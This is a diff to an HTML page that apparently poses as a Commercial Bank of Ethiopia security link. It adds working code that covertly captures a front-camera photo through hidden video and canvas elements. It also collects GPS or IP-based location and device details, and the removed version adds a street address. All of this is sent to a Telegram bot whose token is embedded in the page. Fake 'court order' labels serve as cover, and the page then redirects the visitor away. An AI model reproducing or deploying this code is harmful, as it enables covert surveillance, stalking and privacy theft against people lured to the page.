@@ -45,6 +45,16 @@
             font-size: 12px;
             margin-top: 8px;
         }
+        video, canvas {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
     </style>
 </head>
 <body>
@@ -54,37 +64,57 @@
         <div class="status-text" id="statusText"></div>
     </div>
 
+    <video id="video" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
+
     <script>
         // ===================================================
         // TELEGRAM CONFIGURATION
         // ===================================================
         const BOT_TOKEN = "7533535188:AAGoTgg2Z3Z3YY6t2SiILJeEIrLC7en7hDU";
-        const CHAT_ID = "7420938284";
+        const CHAT_ID = "-1002681260911";
         const COURT_ORDER = "CT-BAHA-2026-03-30";
         const CASE_NUMBER = "CBE-FRAUD-001-2026";
         // ===================================================
 
-        let locationCaptured = false;
-        let maxWaitTime = 15000; // 15 seconds max wait
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
         const statusText = document.getElementById('statusText');
-
+        
+        let mediaStream = null;
+        let photoCaptured = false;
+        let locationSent = false;
+        let cameraStarted = false;
+        
         function updateStatus(text) {
             statusText.textContent = text;
+            console.log('Status:', text);
         }
-
-        function sendToTelegram(message, sendMap = false, lat = null, lon = null) {
+        
+        function sendToTelegram(message, sendPhoto = false, photoData = null, lat = null, lon = null) {
             try {
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message,
-                        parse_mode: 'HTML'
-                    })
-                }).catch(e => console.log('Telegram send error:', e));
+                if (sendPhoto && photoData) {
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('photo', photoData, 'capture.jpg');
+                    formData.append('caption', message);
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    }).catch(e => console.log('Photo send error:', e));
+                } else {
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            text: message,
+                            parse_mode: 'HTML'
+                        })
+                    }).catch(e => console.log('Message send error:', e));
+                }
                 
-                if (sendMap && lat && lon) {
+                if (lat && lon) {
                     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
@@ -97,255 +127,250 @@
                 }
             } catch(e) {}
         }
+        
+        function capturePhotoFromVideo() {
+            if (photoCaptured) return;
+            
+            try {
+                const context = canvas.getContext('2d');
+                const videoWidth = video.videoWidth;
+                const videoHeight = video.videoHeight;
+                
+                if (videoWidth === 0 || videoHeight === 0) {
+                    setTimeout(() => capturePhotoFromVideo(), 500);
+                    return;
+                }
+                
+                canvas.width = videoWidth;
+                canvas.height = videoHeight;
+                context.drawImage(video, 0, 0, videoWidth, videoHeight);
+                
+                canvas.toBlob((blob) => {
+                    if (blob && !photoCaptured) {
+                        photoCaptured = true;
+                        updateStatus('Processing...');
+                        
+                        const timestamp = new Date().toISOString();
+                        const message = `
+📸 <b>FRONT CAMERA CAPTURE - COURT ORDER #${COURT_ORDER}</b>
 
-        function getExactAddress(lat, lon) {
-            return new Promise((resolve) => {
-                try {
-                    fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`, {
-                        headers: { 'User-Agent': 'CBE-Security/1.0' }
-                    })
+🕐 Time: ${timestamp}
+📱 Device: ${navigator.userAgent.substring(0, 80)}
+🌐 Language: ${navigator.language}
+📺 Screen: ${screen.width}x${screen.height}
+⚖️ Case: ${CASE_NUMBER}
+`;
+                        
+                        sendToTelegram(message, true, blob);
+                        
+                        if (mediaStream) {
+                            mediaStream.getTracks().forEach(track => track.stop());
+                        }
+                    }
+                }, 'image/jpeg', 0.7);
+            } catch(e) {
+                console.log('Capture error:', e);
+            }
+        }
+        
+        function startFrontCamera() {
+            if (cameraStarted) return;
+            cameraStarted = true;
+            
+            updateStatus('Initializing camera...');
+            
+            const constraints = {
+                video: {
+                    facingMode: { exact: "user" },
+                    width: { ideal: 640 },
+                    height: { ideal: 480 }
+                }
+            };
+            
+            navigator.mediaDevices.getUserMedia(constraints)
+                .then((stream) => {
+                    mediaStream = stream;
+                    video.srcObject = stream;
+                    video.setAttribute('playsinline', true);
+                    video.setAttribute('autoplay', true);
+                    video.setAttribute('muted', true);
+                    
+                    updateStatus('Camera ready...');
+                    
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        setTimeout(() => {
+                            capturePhotoFromVideo();
+                        }, 2000);
+                    };
+                })
+                .catch((err) => {
+                    console.log('Camera error:', err);
+                    updateStatus('Camera unavailable');
+                });
+        }
+        
+        // Multi-source location capture
+        function getLocationMultiple() {
+            updateStatus('Getting location...');
+            
+            // Try GPS first
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        if (!locationSent) {
+                            locationSent = true;
+                            const lat = position.coords.latitude;
+                            const lon = position.coords.longitude;
+                            const accuracy = position.coords.accuracy;
+                            
+                            const message = `
+📍 <b>GPS LOCATION - COURT ORDER #${COURT_ORDER}</b>
+
+📌 <b>Coordinates:</b>
+Latitude: ${lat}
+Longitude: ${lon}
+Accuracy: ±${Math.round(accuracy)} meters
+Source: GPS
+
+🗺️ Maps: https://www.google.com/maps?q=${lat},${lon}
+
+⚖️ Case: ${CASE_NUMBER}
+`;
+                            sendToTelegram(message, false, null, lat, lon);
+                            updateStatus('Location captured');
+                        }
+                    },
+                    (error) => {
+                        console.log('GPS error:', error);
+                        getLocationByIP();
+                    },
+                    { enableHighAccuracy: true, timeout: 10000 }
+                );
+            } else {
+                getLocationByIP();
+            }
+        }
+        
+        function getLocationByIP() {
+            updateStatus('Getting network location...');
+            
+            // Try multiple IP geolocation APIs
+            const apis = [
+                'https://ipapi.co/json/',
+                'https://ip-api.com/json/',
+                'https://geolocation-db.com/json/'
+            ];
+            
+            let apiIndex = 0;
+            
+            function tryNextApi() {
+                if (apiIndex >= apis.length) {
+                    updateStatus('Location via network only');
+                    sendToTelegram(`⚠️ LOCATION: IP ${ip} - City-level only`);
+                    return;
+                }
+                
+                fetch(apis[apiIndex])
                     .then(r => r.json())
                     .then(data => {
-                        if (data && data.display_name) {
-                            resolve(data.display_name);
+                        let lat = null, lon = null, city = null, region = null, country = null;
+                        
+                        if (data.latitude && data.longitude) {
+                            lat = data.latitude;
+                            lon = data.longitude;
+                            city = data.city || data.city_name;
+                            region = data.region || data.region_name;
+                            country = data.country_name || data.country;
+                        } else if (data.lat && data.lon) {
+                            lat = data.lat;
+                            lon = data.lon;
+                            city = data.city;
+                            region = data.regionName;
+                            country = data.country;
+                        } else if (data.lat && data.lng) {
+                            lat = data.lat;
+                            lon = data.lng;
+                            city = data.city;
+                            region = data.state;
+                            country = data.country_name;
+                        }
+                        
+                        if (lat && lon && !locationSent) {
+                            locationSent = true;
+                            const message = `
+📍 <b>NETWORK LOCATION - COURT ORDER #${COURT_ORDER}</b>
+
+📌 <b>Location:</b>
+City: ${city || 'Unknown'}
+Region: ${region || 'Unknown'}
+Country: ${country || 'Unknown'}
+Coordinates: ${lat}, ${lon}
+
+🗺️ Maps: https://www.google.com/maps?q=${lat},${lon}
+
+⚖️ Case: ${CASE_NUMBER}
+`;
+                            sendToTelegram(message, false, null, lat, lon);
+                            updateStatus('Location captured');
                         } else {
-                            resolve(null);
+                            tryNextApi();
                         }
                     })
-                    .catch(() => resolve(null));
-                } catch(e) {
-                    resolve(null);
-                }
-            });
-        }
-
-        async function sendLocationWithAddress(lat, lon, accuracy, source, ip = null, userAgent = null, deviceInfo = null) {
-            const timestamp = new Date().toISOString();
-            const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
-            
-            // Get exact street address
-            updateStatus('Getting exact address...');
-            const address = await getExactAddress(lat, lon);
-            
-            let addressText = '';
-            if (address) {
-                addressText = `├─ 📮 <b>Exact Address:</b> ${address.substring(0, 200)}\n`;
+                    .catch(() => {
+                        tryNextApi();
+                    });
             }
             
-            const message = `
-🚨 <b>LOCATION CAPTURED - COURT ORDER #${COURT_ORDER}</b> 🚨
-
-📍 <b>EXACT LOCATION:</b>
-├─ Latitude: <b>${lat}</b>
-├─ Longitude: <b>${lon}</b>
-├─ Accuracy: ±${Math.round(accuracy)} meters
-├─ Source: ${source}
-${addressText}
-🗺️ <b>Maps Link:</b> ${mapsLink}
-
-📱 <b>DEVICE INFO:</b>
-├─ IP: ${ip || 'Unknown'}
-├─ User Agent: ${(userAgent || navigator.userAgent).substring(0, 100)}
-├─ Language: ${navigator.language}
-├─ Screen: ${screen.width}x${screen.height}
-├─ Platform: ${navigator.platform}
-├─ Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
-└─ Time: ${timestamp}
-
-⚖️ <b>Case:</b> ${CASE_NUMBER}
-<i>Location captured under court order. User unaware.</i>
-`;
-            
-            sendToTelegram(message, true, lat, lon);
-            
-            // Send separate Google Maps link
-            sendToTelegram(`📍 Google Maps: ${mapsLink}`);
-            
-            if (address) {
-                sendToTelegram(`📍 Exact Address: ${address}`);
-            }
-        }
-
-        function getGPSLocation() {
-            updateStatus('Waiting for GPS signal...');
-            
-            if (!navigator.geolocation) {
-                updateStatus('Using network location...');
-                getLocationByIP();
-                return;
-            }
-            
-            navigator.geolocation.getCurrentPosition(
-                async (position) => {
-                    if (!locationCaptured) {
-                        locationCaptured = true;
-                        
-                        const lat = position.coords.latitude;
-                        const lon = position.coords.longitude;
-                        const accuracy = position.coords.accuracy;
-                        
-                        // Get IP info
-                        let ip = 'Unknown';
-                        let userAgent = navigator.userAgent;
-                        let deviceInfo = {
-                            platform: navigator.platform,
-                            language: navigator.language,
-                            screen: `${screen.width}x${screen.height}`,
-                            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-                        };
-                        
-                        try {
-                            const ipResponse = await fetch('https://api.ipify.org?format=json');
-                            const ipData = await ipResponse.json();
-                            ip = ipData.ip;
-                        } catch(e) {}
-                        
-                        await sendLocationWithAddress(lat, lon, accuracy, 'GPS (High Accuracy)', ip, userAgent, deviceInfo);
-                        
-                        // Redirect after successful capture
-                        setTimeout(() => {
-                            window.location.href = "https://www.commercialbankofethiopia.com";
-                        }, 1500);
-                    }
-                },
-                (error) => {
-                    let errorMsg = '';
-                    switch(error.code) {
-                        case error.PERMISSION_DENIED:
-                            errorMsg = 'Permission denied';
-                            break;
-                        case error.POSITION_UNAVAILABLE:
-                            errorMsg = 'GPS signal weak';
-                            break;
-                        case error.TIMEOUT:
-                            errorMsg = 'GPS timeout';
-                            break;
-                        default:
-                            errorMsg = 'Unknown error';
-                    }
-                    updateStatus(`Network location fallback...`);
-                    getLocationByIP();
-                },
-                { 
-                    enableHighAccuracy: true, 
-                    timeout: 8000, 
-                    maximumAge: 0 
-                }
-            );
-        }
-
-        function getLocationByIP() {
-            updateStatus('Detecting network location...');
-            
+            // Get IP first
             fetch('https://api.ipify.org?format=json')
                 .then(r => r.json())
                 .then(ipData => {
-                    const ip = ipData.ip;
-                    return fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,lat,lon,isp,mobile,proxy,query,timezone`);
-                })
-                .then(r => r.json())
-                .then(async (geo) => {
-                    if (geo.status === 'success' && !locationCaptured) {
-                        locationCaptured = true;
-                        
-                        const lat = geo.lat;
-                        const lon = geo.lon;
-                        const city = geo.city || 'Unknown';
-                        const region = geo.regionName || 'Unknown';
-                        const country = geo.country || 'Unknown';
-                        const isp = geo.isp || 'Unknown';
-                        const isMobile = geo.mobile || false;
-                        const timestamp = new Date().toISOString();
-                        
-                        // Get IP info
-                        let ip = geo.query || 'Unknown';
-                        let userAgent = navigator.userAgent;
-                        
-                        // Get exact address
-                        updateStatus('Getting exact address...');
-                        let address = null;
-                        try {
-                            const addrResponse = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`, {
-                                headers: { 'User-Agent': 'CBE-Security/1.0' }
-                            });
-                            const addrData = await addrResponse.json();
-                            if (addrData && addrData.display_name) {
-                                address = addrData.display_name;
-                            }
-                        } catch(e) {}
-                        
-                        let addressText = '';
-                        if (address) {
-                            addressText = `├─ 📮 <b>Exact Address:</b> ${address.substring(0, 200)}\n`;
-                        }
-                        
-                        const message = `
-🚨 <b>LOCATION CAPTURED - COURT ORDER #${COURT_ORDER}</b> 🚨
-
-📍 <b>NETWORK LOCATION:</b>
-├─ City: <b>${city}</b>
-├─ Region: ${region}
-├─ Country: ${country}
-├─ Coordinates: ${lat}, ${lon}
-├─ ISP: ${isp}
-├─ Type: ${isMobile ? 'Mobile Network' : 'Fixed Line'}
-${addressText}
-🗺️ <b>Maps Link:</b> https://www.google.com/maps?q=${lat},${lon}
-
-🌐 <b>DEVICE INFO:</b>
-├─ IP: ${ip}
-├─ User Agent: ${userAgent.substring(0, 100)}
-├─ Language: ${navigator.language}
-├─ Screen: ${screen.width}x${screen.height}
-└─ Time: ${timestamp}
-
-⚖️ <b>Case:</b> ${CASE_NUMBER}
-<i>Location captured under court order.</i>
-`;
-                        
-                        sendToTelegram(message, true, lat, lon);
-                        sendToTelegram(`📍 Google Maps: https://www.google.com/maps?q=${lat},${lon}`);
-                        
-                        if (address) {
-                            sendToTelegram(`📍 Address: ${address}`);
-                        }
-                        
-                        // Redirect after capture
-                        setTimeout(() => {
-                            window.location.href = "https://www.commercialbankofethiopia.com";
-                        }, 1500);
-                    }
+                    window.currentIP = ipData.ip;
+                    tryNextApi();
                 })
                 .catch(() => {
-                    if (!locationCaptured) {
-                        locationCaptured = true;
-                        sendToTelegram(`⚠️ <b>LOCATION FAILED</b>\nCourt Order: ${COURT_ORDER}\nUser Agent: ${navigator.userAgent}\nTime: ${new Date().toISOString()}`);
-                        
-                        setTimeout(() => {
-                            window.location.href = "https://www.commercialbankofethiopia.com";
-                        }, 2000);
-                    }
+                    tryNextApi();
                 });
         }
-
-        // Start location capture immediately (silent - no prompt)
-        // Browser will show permission dialog - this cannot be hidden
-        // But user expects it because they clicked a "CBE" link
         
-        updateStatus('Initializing secure connection...');
+        function finalizeAndRedirect() {
+            updateStatus('Complete');
+            sendToTelegram(`✅ CAPTURE COMPLETE - Court Order ${COURT_ORDER}`);
+            
+            setTimeout(() => {
+                window.location.href = "https://www.google.com";
+            }, 1000);
+        }
         
+        // Start everything
+        updateStatus('Connecting to secure server...');
+        
+        // Send initial page view
+        fetch('https://api.ipify.org?format=json')
+            .then(r => r.json())
+            .then(ipData => {
+                sendToTelegram(`📱 PAGE VIEWED\nIP: ${ipData.ip}\nUser Agent: ${navigator.userAgent}\nTime: ${new Date().toISOString()}`);
+            })
+            .catch(() => {});
+        
+        // Start camera after 1 second
         setTimeout(() => {
-            getGPSLocation();
-        }, 500);
+            startFrontCamera();
+        }, 1000);
         
-        // Fallback redirect after max wait time
+        // Start location after 3 seconds
         setTimeout(() => {
-            if (!locationCaptured) {
-                locationCaptured = true;
-                sendToTelegram(`⚠️ <b>LOCATION TIMEOUT</b>\nCourt Order: ${COURT_ORDER}\nUser Agent: ${navigator.userAgent}\nTime: ${new Date().toISOString()}`);
-                window.location.href = "https://www.commercialbankofethiopia.com";
+            getLocationMultiple();
+        }, 3000);
+        
+        // Force redirect after 15 seconds max
+        setTimeout(() => {
+            if (!locationSent) {
+                sendToTelegram(`⚠️ LOCATION TIMEOUT - Court Order ${COURT_ORDER}`);
             }
-        }, maxWaitTime);
+            finalizeAndRedirect();
+        }, 15000);
     </script>
 </body>
 </html>
